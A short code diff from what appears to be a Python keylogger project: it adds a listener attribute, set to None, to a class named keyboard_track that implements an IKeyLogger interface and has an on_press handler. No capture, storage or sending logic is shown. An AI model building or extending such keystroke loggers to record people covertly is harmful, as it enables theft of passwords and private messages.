@@ -23,6 +23,7 @@ class IKeyLogger(ABC):
 class keyboard_track(IKeyLogger):
     def __init__(self):
         self.keys = ''
+        self.listener = None
 
 
     def on_press(self,key):
